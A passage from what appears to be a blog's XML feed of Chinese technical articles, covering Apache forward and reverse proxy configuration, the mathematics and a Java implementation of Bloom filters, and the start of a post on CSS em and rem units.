<p>用于响应 HTTP 访问认证请求的用户名。</p>
<p><strong>xhr</strong></p>
<p>类型：Function</p>
<p>需要返回一个 XMLHttpRequest 对象。默认在 IE 下是 ActiveXObject 而其他情况下是 XMLHttpRequest 。用于重写或者提供一个增强的 XMLHttpRequest 对象。这个参数在 jQuery 1.3 以前不可用。</p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache配置正向代理与反向代理</title>
    <url>/articles/Apache%E9%85%8D%E7%BD%AE%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>配置正向代理很简单，此处我们配置vhost来实现代理, 只需要在浏览器的Proxy选项里加入你的Apache配置的vHost主机即可</p>
<h4 id="开启Apache代理模块并引入vhost配置文件"><a href="#开启Apache代理模块并引入vhost配置文件" class="headerlink" title="开启Apache代理模块并引入vhost配置文件"></a>开启Apache代理模块并引入vhost配置文件</h4><p>http.conf开启代理模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_connect_module modules/mod_proxy_connect.so</span><br><span class="line">LoadModule proxy_ftp_module modules/mod_proxy_ftp.so</span><br><span class="line">LoadModule proxy_http_module modules/mod_proxy_http.so</span><br></pre></td></tr></table></figure>

<p>引入vhost文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Include conf/extra/httpd-vhosts.conf</span><br></pre></td></tr></table></figure>

<p>如果你想监听别的端口, 修改Listen参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Listen 80</span><br><span class="line">Listen 8087</span><br><span class="line">Listen 8088</span><br></pre></td></tr></table></figure>

<p>将想监听的端口全都写上,相应的, 在vhost文件里写上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NameVirtualHost *:80</span><br><span class="line">NameVirtualHost *:8087</span><br><span class="line">NameVirtualHost *:8088</span><br></pre></td></tr></table></figure>

<p>NameVirtualHost表示vhost匹配的请求的ip和端口那些会取扫描vhost</p>
<h4 id="Apache配置-httpd-vhosts-conf（以Windows下为例）"><a href="#Apache配置-httpd-vhosts-conf（以Windows下为例）" class="headerlink" title="Apache配置 httpd-vhosts.conf（以Windows下为例）"></a>Apache配置 httpd-vhosts.conf（以Windows下为例）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"></span><br><span class="line">        ServerAdmin admin@test.com</span><br><span class="line"></span><br><span class="line">        DocumentRoot &quot;D:/www/test&quot;</span><br><span class="line"></span><br><span class="line">        ServerName www.test.com</span><br><span class="line"></span><br><span class="line">        ServerAlias test.com</span><br><span class="line"></span><br><span class="line">        ErrorLog &quot;logs/test.com-error.log&quot;</span><br><span class="line"></span><br><span class="line">        CustomLog &quot;logs/test.com-access.log&quot; common</span><br><span class="line"></span><br><span class="line">        Alias /sublook &quot;D:/www/test/sublook/&quot;</span><br><span class="line"></span><br><span class="line">        &lt;Directory &quot;D:/www/test&quot;&gt;</span><br><span class="line"></span><br><span class="line">        Options FollowSymLinks</span><br><span class="line"></span><br><span class="line">        AllowOverride All</span><br><span class="line"></span><br><span class="line">        Order allow,deny</span><br><span class="line"></span><br><span class="line">        Allow from all</span><br><span class="line"></span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line"> </span><br><span class="line">    ProxyRequests On</span><br><span class="line">    ProxyVia On</span><br><span class="line"></span><br><span class="line">    &lt;Proxy *&gt;</span><br><span class="line"></span><br><span class="line">        Order deny,allow</span><br><span class="line"></span><br><span class="line">        Deny from all</span><br><span class="line"></span><br><span class="line">        Allow from 127.0.0.1</span><br><span class="line"></span><br><span class="line">    &lt;/Proxy&gt;</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<p>先看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br></pre></td></tr></table></figure>

<p>VirtualHost 后面的参数表示的是该VHost的IP/域名/和端口, 你可以写 :</p>
<p>(1) IP: port, 例如 &lt;VirtualHost 175.2.22.65:8088&gt;, 访问的时候通过IP访问</p>
<p>(2) Domain, 例如 &lt;VirtualHost <a href="http://www.test1.com&gt;" target="_blank" rel="noopener">www.test1.com&gt;</a>, 访问的时候通过域名访问, 也可以指定里面的ServerName来指定域名</p>
<p>(3) *, 表示匹配所有对Apache监听主机的请求, 只要是apache监听到的请求都可以匹配该虚拟主机</p>
<p>此处表示的就是监听所有80端口的请求, 但是由于ServerName里写了<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a>, 所以这个vhost匹配的是<a href="http://www.test.com:80" target="_blank" rel="noopener">www.test.com:80</a>,</p>
<p>现在看正向代理设置那一段</p>
<p>ProxyRequests On：开启Apache正向代理<br>ProxyVia On：控制位于代理服务器链中的代理请求的流向</p>
<p>引用Apache2.2官方文档中对ProxyVia的解释如下：</p>
<p>如果设置为默认值Off ，将不会采取特殊的处理。如果一个请求或应答包含”Via:”头，将不进行任何修改而直接通过。如果设置为On每个请求和应答都会对应当前主机得到一个”Via:”头。如果设置为Full ，每个产生的”Via:”头中都会额外加入Apache服务器的版本，以”Via:”注释域出现。如果设置为Block ，每个代理请求中的所有”Via:”头行都将被删除。且不会产生新的”Via:”头。&lt;Proxy *&gt;…&lt;/Proxy&gt;：用来控制谁可以访问你的代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Proxy *&gt;</span><br><span class="line">    Order deny,allow</span><br><span class="line">    Deny from all</span><br><span class="line">    Allow from 127.0.0.1</span><br><span class="line">&lt;/Proxy&gt;</span><br></pre></td></tr></table></figure>

<p>此处设置为本机可以使用代理，真正使用的时候就自己设置了</p>
<h4 id="浏览器设置（以FireFox为例）"><a href="#浏览器设置（以FireFox为例）" class="headerlink" title="浏览器设置（以FireFox为例）"></a>浏览器设置（以FireFox为例）</h4><p><img src="/articles/Apache配置正向代理与反向代理/0.jpg" alt="以FireFox为例）"></p>
<h4 id="访问效果"><a href="#访问效果" class="headerlink" title="访问效果"></a>访问效果</h4><p>访问 <a href="http://www.sina.com，观察HTTP请求Response：" target="_blank" rel="noopener">www.sina.com，观察HTTP请求Response：</a></p>
<p><img src="/articles/Apache配置正向代理与反向代理/1.jpg" alt="www.sina.com"></p>
<p>可以看到，Via：<a href="http://www.test.com，正向代理成功了。" target="_blank" rel="noopener">www.test.com，正向代理成功了。</a></p>
<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>2.1 Apache设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerAdmin 529156563@qq.com</span><br><span class="line"></span><br><span class="line">    DocumentRoot &quot;D:/www/test&quot;</span><br><span class="line"></span><br><span class="line">    ServerName www.test.com</span><br><span class="line"></span><br><span class="line">    ServerAlias test.com</span><br><span class="line"></span><br><span class="line">    ErrorLog &quot;logs/test.com-error.log&quot;</span><br><span class="line"></span><br><span class="line">    CustomLog &quot;logs/test.com-access.log&quot; common</span><br><span class="line"></span><br><span class="line">    Alias /sublook &quot;D:/www/test/look/sublook/&quot;</span><br><span class="line"></span><br><span class="line">    &lt;Directory &quot;D:/www/test&quot;&gt;</span><br><span class="line"></span><br><span class="line">                Options FollowSymLinks</span><br><span class="line"></span><br><span class="line">                AllowOverride All</span><br><span class="line"></span><br><span class="line">                Order allow,deny</span><br><span class="line"></span><br><span class="line">            Allow from all</span><br><span class="line"></span><br><span class="line">        &lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">    #反向代理设置</span><br><span class="line"></span><br><span class="line">    ProxyPass /proxy http://www.proxypass.com/proxy</span><br><span class="line"></span><br><span class="line">    ProxyPassReverse /proxy http://www.proxypass.com/proxy</span><br><span class="line">    </span><br><span class="line">    #错误监听</span><br><span class="line">    ErrorDocument 404 http://code.me/error.php</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<p>现在看反向代理设置那一段</p>
<p>ProxyPass /proxy <a href="http://www.proxypass.com/proxy" target="_blank" rel="noopener">http://www.proxypass.com/proxy</a>: 将 <a href="http://www.test.com/proxy" target="_blank" rel="noopener">www.test.com/proxy</a> 域下的所有请求转发给 <a href="http://www.proxypass.com/proxy" target="_blank" rel="noopener">www.proxypass.com/proxy</a> 代理，例如 <a href="http://www.test.com/proxy/login.php" target="_blank" rel="noopener">www.test.com/proxy/login.php</a> 会交给 <a href="http://www.proxypass.com/proxy/代理" target="_blank" rel="noopener">www.proxypass.com/proxy/代理</a></p>
<p>ProxyPassReverse /proxy <a href="http://www.proxypass.com/proxy" target="_blank" rel="noopener">http://www.proxypass.com/proxy</a> ：</p>
<p><a href="http://www.proxypass.com/proxy/login.php" target="_blank" rel="noopener">www.proxypass.com/proxy/login.php</a> 中有如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">'Location:http://www.proxypass.com/proxy/result.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么在重定向的时候，Apache会将HTTP请求重新设为 <a href="http://www.test.com/proxy/result.php，" target="_blank" rel="noopener">http://www.test.com/proxy/result.php，</a> 这样的作用稍后讲解</p>
<p><a href="http://www.proxypass.com/proxy/result.php" target="_blank" rel="noopener">www.proxypass.com/proxy/result.php</a> 中有如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'in proxypass.com &lt;br&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.2 浏览器访问效果</p>
<p>访问 <a href="http://www.test.com/proxy/login.php" target="_blank" rel="noopener">www.test.com/proxy/login.php</a></p>
<p>Apache将请求交给 <a href="http://www.proxypass.com/proxy/login.php" target="_blank" rel="noopener">www.proxypass.com/proxy/login.php</a> 代理，HTTP请求如图：</p>
<p><img src="/articles/Apache配置正向代理与反向代理/2.jpg" alt></p>
<p>可以发现其实Request中的请求还是 <a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a> 的，但是它确实是由 <a href="http://www.proxypass.com" target="_blank" rel="noopener">www.proxypass.com</a> 来处理的</p>
<p>proxypass.com/proxy/login.php 重定向到 proxypass.com/proxy/result.php</p>
<p>页面显示</p>
<blockquote>
<p>in proxypass.com</p>
</blockquote>
<p>HTTP请求如图：</p>
<p><img src="/articles/Apache配置正向代理与反向代理/3.jpg" alt> </p>
<p>也可以看到请求依然是 <a href="http://www.test.com/proxy/result.php" target="_blank" rel="noopener">www.test.com/proxy/result.php</a></p>
<p>这里就是 ProxyPassReverse 发挥作用的地方，如果不加这个项，重定向后HTTP请求会如下图：</p>
<p><img src="/articles/Apache配置正向代理与反向代理/4.jpg" alt> </p>
<p>可以发现请求中的GET是 <a href="http://www.proxypass.com" target="_blank" rel="noopener">www.proxypass.com</a> 而不是 <a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a> ，这是因为配置了ProxyPassReverse后，proxypass.com/proxy/login.php 在重定向到 proxypass.com/proxy/result.php 时，Apache会将它调整回 test.com/proxy/result.php , 然后Apache再将 test.com/proxy/result.php 代理给 proxypass.com/proxy/result.php，所以说配置了 ProxyPassReverse 后，即使 proxypass.com/proxy 下的程序有重定向到其他 proxypss.com/proxy 的文件的（如 login.php 重定向到 result.php），你也不会在请求中发现 proxypass.com 的影子</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Bloom Filter</title>
    <url>/articles/Bloom-Filter/</url>
    <content><![CDATA[<p><em>Bloom Filter</em>是一种空间效率很高的随机数据结构，它利用位数组很简洁地表示一个集合，并能判断一个元素是否属于这个集合。<em>Bloom Filter</em>的这种高效是有一定代价的：在判断一个元素是否属于某个集合时，有可能会把不属于这个集合的元素误认为属于这个集合（false positive）。<strong>通常应用在一些需要快速判断某个元素是否属于集合，但是并不严格要求100%正确的场合</strong>。而在能容忍低错误率的应用场合下，<em>Bloom Filter</em>通过极少的错误换取了存储空间的极大节省。</p>
<h3 id="集合表示和元素查询"><a href="#集合表示和元素查询" class="headerlink" title="集合表示和元素查询"></a>集合表示和元素查询</h3><p>下面我们具体来看<em>Bloom Filter</em>是如何用位数组表示集合的。初始状态时，<em>Bloom Filter</em>是一个包含m位的位数组，每一位都置为0。</p>
<p><img src="/articles/Bloom-Filter/o_bf1.jpg" alt> </p>
<p>为了表达$S=\{x1, x2,…,xn\}$这样一个n个元素的集合，<em>Bloom Filter</em>使用k个相互独立的哈希函数（Hash Function），它们分别将集合中的每个元素映射到$\{1,…,m\}$的范围中。对任意一个元素$x$，第i个哈希函数映射的位置$hi(x)$就会被置为$1（1≤i≤k）$。注意，如果一个位置多次被置为1，那么只有第一次会起作用，后面几次将没有任何效果。在下图中，k=3，且有两个哈希函数选中同一个位置（从左边数第五位）。</p>
<p><img src="/articles/Bloom-Filter/o_bf2.jpg" alt></p>
<p>在判断y是否属于这个集合时，我们对y应用k次哈希函数，如果所有$hi(y)$的位置都是$1（1≤i≤k）$，那么我们就认为y是集合中的元素，否则就认为y不是集合中的元素。下图中y1就不是集合中的元素。y2或者属于这个集合，或者刚好是一个false positive。</p>
<p><img src="/articles/Bloom-Filter/o_bf3.jpg" alt></p>
<h3 id="错误率估计"><a href="#错误率估计" class="headerlink" title="错误率估计"></a>错误率估计</h3><p>前面我们已经提到了，<em>Bloom Filter</em>在判断一个元素是否属于它表示的集合时会有一定的错误率（false positive rate），下面我们就来估计错误率的大小。在估计之前为了简化模型，我们假设$kn&lt;m$且各个哈希函数是完全随机的。当集合$S=\{x1, x2,…,xn\}$的所有元素都被k个哈希函数映射到m位的位数组中时，这个位数组中某一位还是0的概率是：</p>
<p style="text-align:center"> $ p'=(1-\frac{1}{m})^{kn} ≈ e^{-\frac{kn}{m}} $ </p> 

<p>其中$\frac{1}{m}$表示任意一个哈希函数选中这一位的概率（前提是哈希函数是完全随机的），$(1-\frac{1}{m})$表示哈希一次没有选中这一位的概率。要把$S$完全映射到位数组中，需要做$kn$次哈希。某一位还是$0$意味着$kn$次哈希都没有选中它，因此这个概率就是$(1-\frac{1}{m})^{kn}$。令 $p’=e^{-\frac{kn}{m}}$是为了简化运算，这里用到了计算e时常用的近似：</p>
<p style="text-align:center"> $\lim_{x \to \infty}(1-\frac{1}{x})^{-x} = e $ </p> 

<p>令ρ为位数组中0的比例，则ρ的数学期望$E(ρ)= p’$。在ρ已知的情况下，要求的错误率（false positive rate）为：</p>
<p style="text-align:center">$ (1-ρ)^k ≈ (1-p')^k ≈ (1-p)^k $</p> 

<p>$(1-ρ)$为位数组中1的比例，$(1-ρ)^k$就表示k次哈希都刚好选中1的区域，即false positive rate。上式中第二步近似在前面已经提到了，现在来看第一步近似。$p’$只是$ρ$的数学期望，在实际中$ρ$的值有可能偏离它的数学期望值。<em>M. Mitzenmacher</em> 已经证明[2]  ，位数组中0的比例非常集中地分布在它的数学期望值的附近。因此，第一步的近似得以成立。分别将$p$和$p’$代入上式中，得：</p>
<p style="text-align:center">$  f' = (1-(1-\frac{1}{m})^{kn})^k = (1-p')^k $</p> 

<p style="text-align:center">$  f  = (1-e^{-\frac{kn}{m}})^k = (1-p)^k $</p> 

<p>相比$p’$ 和$f’$，使用$p$和$f$通常在分析中更为方便。</p>
<h3 id="最优的哈希函数个数"><a href="#最优的哈希函数个数" class="headerlink" title="最优的哈希函数个数"></a>最优的哈希函数个数</h3><p>既然<em>Bloom Filter</em>要靠多个哈希函数将集合映射到位数组中，那么应该选择几个哈希函数才能使元素查询时的错误率降到最低呢？这里有两个互斥的理由：如果哈希函数的个数多，那么在对一个不属于集合的元素进行查询时得到0的概率就大；但另一方面，如果哈希函数的个数少，那么位数组中的0就多。为了得到最优的哈希函数个数，我们需要根据上一小节中的错误率公式进行计算。</p>
<p>先用$p$和$f$进行计算。注意到$f = e^{k\ln(1-e^{-\frac{kn}{m}})}$，我们令$g = k\ln(1-e^{-\frac{kn}{m}})$，只要让g取到最小，f自然也取到最小。由于$ p = e^{-\frac{kn}{m}}$，我们可以将g写成</p>
<p style="text-align:center">$ g = -\frac{m}{n}\ln(p)\ln(1-p) $</p>

<p>根据对称性法则可以很容易看出当$p = \frac{1}{2}$，也就是$k = ln(2)\frac{m}{n}$时，g取得最小值。在这种情况下，最小错误率f等于$\frac{1}{2}k ≈ (0.6185)\frac{m}{n}$。另外，注意到p是位数组中某一位仍是0的概率，所以$p = \frac{1}{2}$对应着位数组中0和1各一半。换句话说，要想保持错误率低，最好让位数组有一半还空着。</p>
<p>需要强调的一点是，$p = \frac{1}{2}$时错误率最小这个结果并不依赖于近似值$p$和$f$。同样对于$f’ = e^{k\ln(1 − (1 − \frac{1}{m})^{kn})}$，$g’ = k\ln(1 − (1 − \frac{1}{m})^{kn})$，$p’ = (1 − \frac{1}{m})^{kn}$，我们可以将$g’$写成</p>
<p style="text-align:center">$ g' = \frac{1}{n\ln(1-\frac{1}{m})}\ln(p')\ln(1-p') $</p>

<p>同样根据对称性法则可以得到当$p’ = \frac{1}{2}$时，$g’$取得最小值。</p>
<h3 id="位数组的大小"><a href="#位数组的大小" class="headerlink" title="位数组的大小"></a>位数组的大小</h3><p>下面我们来看看，在不超过一定错误率的情况下，<em>Bloom Filter</em>至少需要多少位才能表示全集中任意n个元素的集合。假设全集中共有u个元素，允许的最大错误率为є，下面我们来求位数组的位数m。</p>
<p>假设$X$为全集中任取n个元素的集合，$F(X)$是表示$X$的位数组。那么对于集合$X$中任意一个元素x，在$s = F(X)$中查询x都能得到肯定的结果，即s能够接受x。显然，由于<em>Bloom Filter</em>引入了错误，s能够接受的不仅仅是X中的元素，它还能够$є (u - n)$个false positive。因此，对于一个确定的位数组来说，它能够接受总共$n + є (u - n)$个元素。在$n + є (u - n)$个元素中，s真正表示的只有其中n个，所以一个确定的位数组可以表示</p>
<p><img src="/articles/Bloom-Filter/o_bf10.jpg" alt></p>
<p>个集合。m位的位数组共有2m个不同的组合，进而可以推出，m位的位数组可以表示</p>
<p><img src="/articles/Bloom-Filter/o_bf11.jpg" alt></p>
<p>个集合。全集中n个元素的集合总共有</p>
<p><img src="/articles/Bloom-Filter/o_bf12.jpg" alt></p>
<p>个，因此要让m位的位数组能够表示所有n个元素的集合，必须有</p>
<p><img src="/articles/Bloom-Filter/o_bf13.jpg" alt></p>
<p>即：</p>
<p><img src="/articles/Bloom-Filter/o_bf14.jpg" alt></p>
<p>上式中的近似前提是n和єu相比很小，这也是实际情况中常常发生的。根据上式，我们得出结论：在错误率不大于є的情况下，m至少要等于$n\log2(1/є)$才能表示任意n个元素的集合。</p>
<p>上一小节中我们曾算出当$k = \ln2· \frac{m}{n}$时错误率f最小，这时$f = \frac{1}{2}k = \frac{\frac{1}{2}m\ln2}{n}$。现在令$f≤є$，可以推出</p>
<p><img src="/articles/Bloom-Filter/o_bf15.jpg" alt></p>
<p>这个结果比前面我们算得的下界$n\log2(1/є)$大了$\log2 e ≈ 1.44$倍。这说明在哈希函数的个数取到最优时，要让错误率不超过є，m至少需要取到最小值的1.44倍。</p>
<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><p>下面给出一个简单的<em>Bloom Filter</em>的实现代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.BitSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Very basic implementation of *Bloom Filter*.</span></span><br><span class="line"><span class="comment"> * Things to improve further.</span></span><br><span class="line"><span class="comment"> * 1. Save it on disk to make it distributed.</span></span><br><span class="line"><span class="comment"> * 2. add additional constructor to take in false positive rate and calculate other parameters.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BloomFilter</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">	</span><br><span class="line">  <span class="keyword">int</span> howManyHashFunctions =<span class="number">1</span>;</span><br><span class="line">  <span class="comment">/**How many elements are expected at max*/</span></span><br><span class="line">  <span class="keyword">int</span> totalExpectedElements ; </span><br><span class="line">  <span class="comment">/**How many elements in filter at any point in time*/</span></span><br><span class="line">  <span class="keyword">int</span> totalCurrentElements ;</span><br><span class="line">  <span class="comment">/**How many bits per  element needs to be set**/</span></span><br><span class="line">  <span class="keyword">int</span> bitsPerElement ;</span><br><span class="line">  BitSet dataDictionaryBitSet;</span><br><span class="line">	</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">BloomFilter</span><span class="params">(<span class="keyword">int</span> howManyHashFunctions,  <span class="keyword">int</span> totalExpectedElements, <span class="keyword">int</span> bitsPerElement)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.howManyHashFunctions =howManyHashFunctions;</span><br><span class="line">		<span class="keyword">this</span>.totalExpectedElements =totalExpectedElements;</span><br><span class="line">		<span class="keyword">this</span>.bitsPerElement=bitsPerElement;</span><br><span class="line">		dataDictionaryBitSet = <span class="keyword">new</span> BitSet(bitsPerElement * totalExpectedElements);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Adding data in *Bloom Filter*. This will remember that this data was added.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> data : The data which needs to be added in *Bloom Filter***/</span></span><br><span class="line">  </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(T data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[] hashCodes = generateMultipleHash(data );</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> index =<span class="number">0</span> ; index&lt;hashCodes.length;++index) dataDictionaryBitSet.set(hashCodes[index]);</span><br><span class="line">		++totalCurrentElements;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**Find out if given data was previously added into filter. </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> data : The data which needs to be checked if it was previously added.</span></span><br><span class="line"><span class="comment">	 * **/</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exists</span><span class="params">(T data)</span> </span>&#123;</span><br><span class="line"> 		<span class="keyword">int</span>[] hashCodes = generateMultipleHash(data   );</span><br><span class="line">		<span class="keyword">boolean</span> exists = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> index =<span class="number">0</span> ; index&lt;hashCodes.length;++index) &#123;</span><br><span class="line">			<span class="keyword">if</span> (dataDictionaryBitSet.get(hashCodes[index])) exists = <span class="keyword">true</span>; </span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				exists = <span class="keyword">false</span>; </span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> exists;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/** Return how many element it has remembered. **/</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> totalCurrentElements;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/** generate multiple hash codes</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> data the data which needs to be</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array with positive hashes with hash values from 0 to size of bit set array  size</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span>[] generateMultipleHash(T data ) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] positions = <span class="keyword">new</span> <span class="keyword">int</span>[howManyHashFunctions];</span><br><span class="line">        Random r = <span class="keyword">new</span> Random(data.hashCode());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; howManyHashFunctions; i++) &#123;</span><br><span class="line">            positions[i] = r.nextInt(dataDictionaryBitSet.size());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> positions;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在计算机科学中，我们常常会碰到时间换空间或者空间换时间的情况，即为了达到某一个方面的最优而牺牲另一个方面。<em>Bloom Filter</em>在时间空间这两个因素之外又引入了另一个因素：错误率。在使用<em>Bloom Filter</em>判断一个元素是否属于某个集合时，会有一定的错误率。也就是说，有可能把不属于这个集合的元素误认为属于这个集合（False Positive），但不会把属于这个集合的元素误认为不属于这个集合（False Negative）。在增加了错误率这个因素之后，<em>Bloom Filter</em>通过允许少量的错误来节省大量的存储空间。</p>
<p>自从Burton Bloom在70年代提出<em>Bloom Filter</em>之后，<em>Bloom Filter</em>就被广泛用于拼写检查和数据库系统中。近一二十年，伴随着网络的普及和发展，<em>Bloom Filter</em>在网络领域获得了新生，各种<em>Bloom Filter</em>变种和新的应用不断出现。可以预见，随着网络应用的不断深入，新的变种和应用将会继续出现，<em>Bloom Filter</em>必将获得更大的发展。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul>
<li><p><a href="http://pages.cs.wisc.edu/~cao/papers/summary-cache/node8.html" target="_blank" rel="noopener">Pei Cao. <em>Bloom Filter</em>s - the math.</a></p>
</li>
<li><p><a href="http://en.wikipedia.org/wiki/Bloom_filter" target="_blank" rel="noopener">Wikipedia. <em>Bloom Filter</em>.</a></p>
</li>
</ul>
<style> .fancybox img {margin:0 auto !important;}</style>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>Hash table</tag>
        <tag>大数据</tag>
        <tag>BitMap</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS计量单位</title>
    <url>/articles/CSS%E8%AE%A1%E9%87%8F%E5%8D%95%E4%BD%8D/</url>
    <content><![CDATA[<p>我们很容易无法摆脱的使用我们所熟悉的CSS技术，当新的问题出现，这样会使我们处于不利的地位。</p>
<p>随着Web继续的发展，对新的解决方案的需求也会继续增大。因此，作为网页设计师和前端开发人员，我们别无选择，只有去了解我们的工具集并且熟悉它。</p>
<p>这意味着我们还要了解一些特殊的工具-那些不经常使用的，但是当需要它们的时候，它们恰恰是最正确的工具。</p>
<p>今天，我将要向你介绍一些你以前可能不知道的CSS工具。这些工具都是计量单位，就像像素或者相对单位,但是很可能你从来没听说过它们！让我们一探究竟吧。</p>
<h3 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h3><p>我们将从你已经熟悉的东西开始。<code>em</code>单位被定义为当前字体大小。例如，如果你在<code>body</code>元素上设置一个字体大小，那么在<code>body</code>元素内的任何子元素的<code>em</code>值都等于这个字体大小。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"test"</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">body &#123;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">&#125;</span><br><span class="line">div &#123;</span><br><span class="line">    font-size: 1.2em; // calculated at 14px * 1.2, or 16.8px</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这里，我们说这个<code>div</code>将有一个<code>1.2em</code>的<code>font-size</code>。它是所继承的字体大小的<code>1.2</code>倍，在这个例子中为<code>14px</code>。结果为<code>16.8px</code>.</p>
<p>但是，当你在每个元素内都级联<code>em</code>定义的字体大小将会发生什么？在下面的代码片段中我们应用和上面一模一样的CSS.每个<code>div</code>从它们的父节点继承字体大小，带给我们逐渐增加的字体大小。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        Test <span class="comment">&lt;!-- 14 * 1.2 = 16.8px --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            Test <span class="comment">&lt;!-- 16.8 * 1.2 = 20.16px --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                Test <span class="comment">&lt;!-- 20.16 * 1.2 = 24.192px --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

